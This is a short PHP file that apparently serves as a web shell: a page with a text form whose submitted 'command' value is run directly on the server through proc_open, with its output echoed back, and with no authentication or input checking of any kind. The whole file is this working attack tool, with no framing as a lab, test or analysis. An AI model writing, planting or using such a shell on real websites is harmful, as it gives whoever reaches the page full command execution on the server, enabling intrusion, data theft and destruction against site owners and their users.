<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'];
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $process = proc_open($command, $descriptorspec, $pipes);
    if (is_resource($process)) {
        echo stream_get_contents($pipes[1]);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}
?>
<form method="POST">
    <input type="text" name="command" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
